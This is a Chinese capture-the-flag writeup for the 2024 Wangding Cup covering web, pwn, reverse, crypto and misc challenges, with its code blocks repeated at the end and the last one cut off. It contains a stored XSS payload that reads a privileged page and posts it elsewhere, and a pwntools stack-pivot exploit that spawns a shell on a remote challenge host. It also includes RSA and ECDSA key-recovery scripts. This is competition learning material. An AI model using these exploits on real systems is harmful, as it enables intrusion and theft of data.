# 2024第四届“网鼎杯”青龙组 writeup

> 原文: https://www.ctfiot.com/212654.html
> ID: 212654

WEB 

WEB02：

访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？

img

进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功

img

之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由

img

之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的

img

所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了

img

<script>

  fetch('/flag').then(response => response.text()).then(data => {
    fetch('/content/2f9f1f36782a270b689d8c0f3e9e08df',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:"content=123"%2bdata
    })
  })
  </script>

 PWN 

PWN02

首先是一个login的登录绕过，直接按照它的要求输就好了

img

然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打

img

然后看到有给出完整后门，那么就好打了

img

img

直接栈迁移打system

img

from pwn import *
context(os='linux',arch='i386',log_level='debug')
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#io=process("./pwn")
io=remote("0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn",44958)
sh_address=0x0804A038
ret_address=0x08048674
io.recvuntil("Enter your username: ")
io.sendline(b'adminx00')
io.recvuntil("Enter your password: ")
io.sendline(b'admin123x00')

io.recvuntil(b"0x")
stac = int(io.recv(8),16)
print(hex(stac))

payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b"x00")+p32(stac-4)+p32(ret_address)

io.sendlineafter("plz input your msg:n",payload)
io.interactive()

 REVERSE 

REVERSE01

安卓题，有混淆，先找MainActivity，锁定主要逻辑如下
img

主要就是跟其中的check方法，发现是native层加密逻辑
img

那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4
img

那么直接找key嗦一把试试
img

注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好
img

data="Z0099864"
print(data[::-1])
#4689900Z

拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文
img

最终解出flag
img

REVERSE02

逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密
img

第一段是乘以2
img

第二段是异或
img

第三段是自定义码表的一个base64
img

第四段是解一个AES
img

EXP：

其中第三段解base64的结果为
img

s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]
print("part1:",end='')
for i in range(len(s2)):
    print(chr(round(s2[i]/2)),end='')
# #part1:81fe0766

data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]
xor_key="XorrLord"
print("npart2:",end='')
for i in range(len(xor_key)):
    print(chr(data[i]^ord(xor_key[i])),end='')
#part2:197e1bc6

#part3:809832f4

from Crypto.Cipher import AES

key = b"AesMasterAesMast"  
cipher = AES.new(key, AES.MODE_ECB)

v4 = bytes([251, 217, 179, 171, 217, 136, 230, 11, 147, 124, 149, 235, 148, 219, 11, 84])

# 使用 AES ECB 模式解密 v4
decrypted_data = cipher.decrypt(v4)

print("npart4:", decrypted_data)

#par4:d346fe66

拼接起来得到最终的flag为wdflag{81fe0766197e1bc6809832f4d346fe66}

 CRYPTO 

CRYPTO01

直接上网搜索，找到原题

https://www.cnblogs.com/mumuhhh/p/17789591.html

img

img

根据给出的脚本进行解密

import time
time.clock = time.time
 
debug = True
 
strict = False
 
helpful_only = True
dimension_min = 7 # 如果晶格达到该尺寸，则停止移除
# 显示有用矢量的统计数据
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1
            
    print (nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# 显示带有 0 和 X 的矩阵
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60: 
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        #print (a)

# 尝试删除无用的向量
# 从当前 = n-1（最后一个向量）开始
def remove_unhelpful(BB, monomials, bound, current):
    # 我们从当前 = n-1（最后一个向量）开始
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB
 
    # 开始从后面检查
    for ii in range(current, -1, -1):
        #  如果它没有用
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
             # 让我们检查它是否影响其他向量
            for jj in range(ii + 1, BB.dimensions()[0]):
                # 如果另一个向量受到影响：
                # 我们增加计数
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj
 
            # 等级：0
            # 如果没有其他载体最终受到影响
            # 我们删除它
            if affected_vectors == 0:
                #print ("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB
 
           # 等级：1
            #如果只有一个受到影响，我们会检查
            # 如果它正在影响别的向量
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # 如果它影响哪怕一个向量
                    # 我们放弃这个
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # 如果没有其他向量受到影响，则将其删除，并且
                # 这个有用的向量不够有用
                #与我们无用的相比
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    #print ("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB
 
""" 
Returns:
* 0,0   if it fails
* -1，-1 如果 "strict=true"，并且行列式不受约束
* x0,y0 the solutions of `pol`
"""
def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May
 
 在以下情况下找到解决方案：
* d < N^delta
* |x|< e^delta
* |y|< e^0.5
每当 delta < 1 - sqrt（2）/2 ~ 0.292
    """
 
    # substitution (Herrman and May)
    PR.<u, x, y> = PolynomialRing(ZZ)   #多项式环
    Q = PR.quotient(x*y + 1 - u)        #  u = xy + 1
    polZ = Q(pol).lift()
 
    UU = XX*YY + 1
 
    # x-移位
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk
            gg.append(xshift)
    gg.sort()
 
    # 单项式 x 移位列表
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials(): #对于多项式中的单项式。单项式（）：
            if monomial not in monomials:  # 如果单项不在单项中
                monomials.append(monomial)
    monomials.sort()
 
    # y-移位
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift) # substitution
 
    # 单项式 y 移位列表
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            monomials.append(u^kk * y^jj)
 
    # 构造格 B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)
 
    #约化格的原型
    if helpful_only:
        #  #自动删除
        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)
        # 重置维度
        nn = BB.dimensions()[0]
        if nn == 0:
            print ("failure")
            return 0,0
 
    # 检查向量是否有帮助
    if debug:
        helpful_vectors(BB, modulus^mm)
 
    # 检查行列式是否正确界定
    det = BB.det()
    bound = modulus^(mm*nn)
    if det >= bound:
        print ("We do not have det < bound. Solutions might not be found.")
        print ("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print ("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print ("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
 
    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^mm)
 
    # LLL
    if debug:
        print ("optimizing basis of the lattice via LLL, this can take a long time")
 
    #BB = BB.BKZ(block_size=25)
    BB = BB.LLL()
 
    if debug:
        print ("LLL is done!")
 
    # 替换向量 i 和 j ->多项式 1 和 2
    if debug:
        print ("在格中寻找线性无关向量")
    found_polynomials = False
 
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
 
            # 对于i and j, 构造两个多项式
 
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)
                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)
 
            # 结果
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)
 
 
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print ("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break
 
    if not found_polynomials:
        print ("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
 
    rr = rr(q, q)
 
    # solutions
    soly = rr.roots()
 
    if len(soly) == 0:
        print ("Your prediction (delta) is too small")
        return 0, 0
 
    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]
    return solx, soly
 
def example():
    ##################################################################
    # 随机生成数据
    ###############################################################
    #start_time =time.perf_counter
    start =time.clock()
    size=512
    length_N = 2*size;
    ss=0
    s=70;
    M=1   # the number of experiments
    delta = 299/1024
    # p =  random_prime(2^512,2^511)
    for i in range(M):
#         p =  random_prime(2^size,None,2^(size-1))
#         q =  random_prime(2^size,None,2^(size-1))
#         if(p<q):
#             temp=p
#             p=q
#             q=temp
        N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721
        e = 28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771
        c = 22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302
        hint1 = 654543761191063613807  # p高位
        hint2 = 819778612327847774041  # q高位
#         print ("p真实高",s,"比特：", int(p/2^(512-s)))
#         print ("q真实高",s,"比特：", int(q/2^(512-s)))
 
#         N = p*q;
 
 
    # 解密指数d的指数( 最大0.292)
 
 
 
        m = 7   # 格大小（越大越好/越慢）
        t = round(((1-2*delta) * m))  # 来自 Herrmann 和 May 的优化
        X = floor(N^delta)  # 
        Y = floor(N^(1/2)/2^s)    # 如果 p、 q 大小相同，则正确
        for l in range(int(hint1),int(hint1)+1):
            print('nnn l=',l)
            pM=l;
            p0=pM*2^(size-s)+2^(size-s)-1;
            q0=N/p0;
            qM=int(q0/2^(size-s))
            A = N + 1-pM*2^(size-s)-qM*2^(size-s);
        #A = N+1
            P.<x,y> = PolynomialRing(ZZ)
            pol = 1 + x * (A + y)  #构建的方程
 
            # Checking bounds
            #if debug:
                #print ("=== 核对数据 ===")
                #print ("* delta:", delta)
                #print ("* delta < 0.292", delta < 0.292)
                #print ("* size of e:", ceil(log(e)/log(2)))  # e的bit数
                # print ("* size of N:", len(bin(N)))          # N的bit数
                #print ("* size of N:", ceil(log(N)/log(2)))  # N的bit数
                #print ("* m:", m, ", t:", t)
 
            # boneh_durfee
            if debug:
                ###print ("=== running algorithm ===")
                start_time = time.time()
 
 
            solx, soly = boneh_durfee(pol, e, m, t, X, Y)
 
 
            if solx > 0:
                #print ("=== solution found ===")
                if False:
                    print ("x:", solx)
                    print ("y:", soly)
 
                d_sol = int(pol(solx, soly) / e)
                ss=ss+1

                print ("=== solution found ===")
                print ("p的高比特为：",l)
                print ("q的高比特为：",qM)
                print ("d=",d_sol) 
 
            if debug:
                print("=== %s seconds ===" % (time.time() - start_time))
            #break
        print("ss=",ss)
                            #end=time.process_time
        end=time.clock()
        print('Running time: %s Seconds'%(end-start))
if __name__ == "__main__":
    example()  

img

跑第二个脚本，得到flag

img

wdflag{31998a91-fd51-4df2-864e-73c122786868}

CRYPTO02

下载附件，打开代码，问豆包

img

# 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA
from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from sympy import nextprime
import gmpy2
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 已知的参数
r1 = 66378485426889535028763915423685212583706810153195012097516816885575964878246
r2 = 66378485426889535028763915423685212583706810153195012097516816885575964878246
s1 = 73636354334739290806716081380360143742414582638332132893041295586890856253300
s2 = 64320109990895398581134015047131652648423777800538748939578192006599226954034
z1 = 35311306706233977395060423051262119784421232920823462737043282589337379493964
z2 = 101807556569342254666094290602497540565936025601030395061064067677254735341454

p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

# 根据椭圆曲线签名的恢复公式
# s1 * k - z1 = r1 * dA (mod n)
# s2 * k - z2 = r2 * dA (mod n)
# 由于r1 = r2，可以通过联立方程求解dA
k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n
dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n

# 使用恢复的dA生成AES密钥
key = sha256(long_to_bytes(dA)).digest()

# 已知的加密后的flag十六进制字符串
encrypted_flag_hex = '3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b'
encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)

# 提取IV和密文
iv = encrypted_flag_bytes[:AES.block_size]
ciphertext = encrypted_flag_bytes[AES.block_size:]

# 创建AES解密对象
cipher = AES.new(key, AES.MODE_CBC, iv)
# 解密
decrypted_data = cipher.decrypt(ciphertext)
# 去除填充
plaintext = unpad(decrypted_data, AES.block_size)

# 对替换加密的逆过程（victory_encrypt的逆）
victory_key = "WANGDINGCUP"
key_length = len(victory_key)
decrypted_text = ""
for i, char in enumerate(plaintext.decode().upper()):
    if char.isalpha():
        shift = ord(victory_key[i % key_length]) - ord('A')
        decrypted_char = chr((ord(char) - ord('A') - shift + 26) % 26 + ord('A'))
        decrypted_text += decrypted_char
    else:
        decrypted_text += char

print(decrypted_text)

运行后成功获取到flag，要转小写

img

img

 MISC 

MISC01

下载附件看题目描述

img

拿wireshark看

img

img

img

md5加密

img

最后得到flag

wdflag{bd9bfee6c7303048dab68cfa6a14b5e7}

MISC03

找攻击IP

img

img

攻击IP为：39.168.5.60

MISC04

给了一个这个抽象图片，蓝底红线，凭直觉一个是需要还原成二维码的形式

img

根据题干，他是有一个图像加密算法，需要把这个红线还原重组成二维码，搜索一个是这个Peano曲线

最终找到了一个irisctf的一道赛题The Peano Scramble

https://almostgph.github.io/2024/01/08/IrisCTF2024/

from PIL import Image
from tqdm import tqdm

def peano(n):
    if n == 0:
        return [[0,0]]
    else:
        in_lst = peano(n - 1)
        lst = in_lst.copy()
        px,py = lst[-1]
        lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + 1 + i[0], py - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst)
        return lst

order = peano(6)

img = Image.open(r"./1.png")

width, height = img.size

block_width = width # // 3
block_height = height # // 3

new_image = Image.new("RGB", (width, height))

for i, (x, y) in tqdm(enumerate(order)):
    # 根据列表顺序获取新的坐标
    new_x, new_y = i % width, i // width
    # 获取原图像素
    pixel = img.getpixel((x, height - 1 - y))
    # 在新图像中放置像素
    new_image.putpixel((new_x, new_y), pixel)

new_image.save("rearranged_image.jpg") 

img

扫码即可

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<script>

  fetch('/flag').then(response => response.text()).then(data => {
    fetch('/content/2f9f1f36782a270b689d8c0f3e9e08df',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:"content=123"%2bdata
    })
  })
  </script>
```



```
from pwn import *
context(os='linux',arch='i386',log_level='debug')
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#io=process("./pwn")
io=remote("0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn",44958)
sh_address=0x0804A038
ret_address=0x08048674
io.recvuntil("Enter your username: ")
io.sendline(b'adminx00')
io.recvuntil("Enter your password: ")
io.sendline(b'admin123x00')

io.recvuntil(b"0x")
stac = int(io.recv(8),16)
print(hex(stac))

payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b"x00")+p32(stac-4)+p32(ret_address)

io.sendlineafter("plz input your msg:n",payload)
io.interactive()
```



```
data="Z0099864"
print(data[::-1])
#4689900Z
```



```
s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]
print("part1:",end='')
for i in range(len(s2)):
    print(chr(round(s2[i]/2)),end='')
# #part1:81fe0766

data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]
xor_key="XorrLord"
print("npart2:",end='')
for i in range(len(xor_key)):
    print(chr(data[i]^ord(xor_key[i])),end='')
#part2:197e1bc6

#part3:809832f4

from Crypto.Cipher import AES

key = b"AesMasterAesMast"  
cipher = AES.new(key, AES.MODE_ECB)

v4 = bytes([251, 217, 179, 171, 217, 136, 230, 11, 147, 124, 149, 235, 148, 219, 11, 84])

# 使用 AES ECB 模式解密 v4
decrypted_data = cipher.decrypt(v4)

print("npart4:", decrypted_data)

#par4:d346fe66
```



```
import time
time.clock = time.time
 
debug = True
 
strict = False
 
helpful_only = True
dimension_min = 7 # 如果晶格达到该尺寸，则停止移除
# 显示有用矢量的统计数据
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1
            
    print (nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# 显示带有 0 和 X 的矩阵
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60: 
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        #print (a)

# 尝试删除无用的向量
# 从当前 = n-1（最后一个向量）开始
def remove_unhelpful(BB, monomials, bound, current):
    # 我们从当前 = n-1（最后一个向量）开始
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB
 
    # 开始从后面检查
    for ii in range(current, -1, -1):
        #  如果它没有用
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
             # 让我们检查它是否影响其他向量
            for jj in range(ii + 1, BB.dimensions()[0]):
                # 如果另一个向量受到影响：
                # 我们增加计数
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj
 
            # 等级：0
            # 如果没有其他载体最终受到影响
            # 我们删除它
            if affected_vectors == 0:
                #print ("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB
 
           # 等级：1
            #如果只有一个受到影响，我们会检查
            # 如果它正在影响别的向量
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # 如果它影响哪怕一个向量
                    # 我们放弃这个
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # 如果没有其他向量受到影响，则将其删除，并且
                # 这个有用的向量不够有用
                #与我们无用的相比
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    #print ("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB
 
""" 
Returns:
* 0,0   if it fails
* -1，-1 如果 "strict=true"，并且行列式不受约束
* x0,y0 the solutions of `pol`
"""
def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May
 
 在以下情况下找到解决方案：
* d < N^delta
* |x|< e^delta
* |y|< e^0.5
每当 delta < 1 - sqrt（2）/2 ~ 0.292
    """
 
    # substitution (Herrman and May)
    PR.<u, x, y> = PolynomialRing(ZZ)   #多项式环
    Q = PR.quotient(x*y + 1 - u)        #  u = xy + 1
    polZ = Q(pol).lift()
 
    UU = XX*YY + 1
 
    # x-移位
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk
            gg.append(xshift)
    gg.sort()
 
    # 单项式 x 移位列表
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials(): #对于多项式中的单项式。单项式（）：
            if monomial not in monomials:  # 如果单项不在单项中
                monomials.append(monomial)
    monomials.sort()
 
    # y-移位
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift) # substitution
 
    # 单项式 y 移位列表
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            monomials.append(u^kk * y^jj)
 
    # 构造格 B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)
 
    #约化格的原型
    if helpful_only:
        #  #自动删除
        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)
        # 重置维度
        nn = BB.dimensions()[0]
        if nn == 0:
            print ("failure")
            return 0,0
 
    # 检查向量是否有帮助
    if debug:
        helpful_vectors(BB, modulus^mm)
 
    # 检查行列式是否正确界定
    det = BB.det()
    bound = modulus^(mm*nn)
    if det >= bound:
        print ("We do not have det < bound. Solutions might not be found.")
        print ("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print ("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print ("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
 
    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^mm)
 
    # LLL
    if debug:
        print ("optimizing basis of the lattice via LLL, this can take a long time")
 
    #BB = BB.BKZ(block_size=25)
    BB = BB.LLL()
 
    if debug:
        print ("LLL is done!")
 
    # 替换向量 i 和 j ->多项式 1 和 2
    if debug:
        print ("在格中寻找线性无关向量")
    found_polynomials = False
 
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
 
            # 对于i and j, 构造两个多项式
 
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)
                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)
 
            # 结果
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)
 
 
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print ("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break
 
    if not found_polynomials:
        print ("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
 
    rr = rr(q, q)
 
    # solutions
    soly = rr.roots()
 
    if len(soly) == 0:
        print ("Your prediction (delta) is too small")
        return 0, 0
 
    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]
    return solx, soly
 
def example():
    ##################################################################
    # 随机生成数据
    ###############################################################
    #start_time =time.perf_counter
    start =time.clock()
    size=512
    length_N = 2*size;
    ss=0
    s=70;
    M=1   # the number of experiments
    delta = 299/1024
    # p =  random_prime(2^512,2^511)
    for i in range(M):
#         p =  random_prime(2^size,None,2^(size-1))
#         q =  random_prime(2^size,None,2^(size-1))
#         if(p<q):
#             temp=p
#             p=q
#             q=temp
        N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721
        e = 28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771
        c = 22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302
        hint1 = 654543761191063613807  # p高位
        hint2 = 819778612327847774041  # q高位
#         print ("p真实高",s,"比特：", int(p/2^(512-s)))
#         print ("q真实高",s,"比特：", int(q/2^(512-s)))
 
#         N = p*q;
 
 
    # 解密指数d的指数( 最大0.292)
 
 
 
        m = 7   # 格大小（越大越好/越慢）
        t = round(((1-2*delta) * m))  # 来自 Herrmann 和 May 的优化
        X = floor(N^delta)  # 
        Y = floor(N^(1/2)/2^s)    # 如果 p、 q 大小相同，则正确
        for l in range(int(hint1),int(hint1)+1):
            print('nnn l=',l)
            pM=l;
            p0=pM*2^(size-s)+2^(size-s)-1;
            q0=N/p0;
            qM=int(q0/2^(size-s))
            A = N + 1-pM*2^(size-s)-qM*2^(size-s);
        #A = N+1
            P.<x,y> = PolynomialRing(ZZ)
            pol = 1 + x * (A + y)  #构建的方程
 
            # Checking bounds
            #if debug:
                #print ("=== 核对数据 ===")
                #print ("* delta:", delta)
                #print ("* delta < 0.292", delta < 0.292)
                #print ("* size of e:", ceil(log(e)/log(2)))  # e的bit数
                # print ("* size of N:", len(bin(N)))          # N的bit数
                #print ("* size of N:", ceil(log(N)/log(2)))  # N的bit数
                #print ("* m:", m, ", t:", t)
 
            # boneh_durfee
            if debug:
                ###print ("=== running algorithm ===")
                start_time = time.time()
 
 
            solx, soly = boneh_durfee(pol, e, m, t, X, Y)
 
 
            if solx > 0:
                #print ("=== solution found ===")
                if False:
                    print ("x:", solx)
                    print ("y:", soly)
 
                d_sol = int(pol(solx, soly) / e)
                ss=ss+1

                print ("=== solution found ===")
                print ("p的高比特为：",l)
                print ("q的高比特为：",qM)
                print ("d=",d_sol) 
 
            if debug:
                print("=== %s seconds ===" % (time.time() - start_time))
            #break
        print("ss=",ss)
                            #end=time.process_time
        end=time.clock()
        print('Running time: %s Seconds'%(end-start))
if __name__ == "__main__":
    example()
```



```
# 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA
from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from sympy import nextprime
import gmpy2
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 已知的参数
r1 = 66378485426889535028763915423685212583706810153195012097516816885575964878246
r2 = 66378485426889535028763915423685212583706810153195012097516816885575964878246
s1 = 73636354334739290806716081380360143742414582638332132893041295586890856253300
s2 = 64320109990895398581134015047131652648423777800538748939578192006599226954034
z1 = 35311306706233977395060423051262119784421232920823462737043282589337379493964
z2 = 101807556569342254666094290602497540565936025601030395061064067677254735341454

p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

# 根据椭圆曲线签名的恢复公式
# s1 * k - z1 = r1 * dA (mod n)
# s2 * k - z2 = r2 * dA (mod n)
# 由于r1 = r2，可以通过联立方程求解dA
k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n
dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n

# 使用恢复的dA生成AES密钥
key = sha256(long_to_bytes(dA)).digest()

# 已知的加密后的flag十六进制字符串
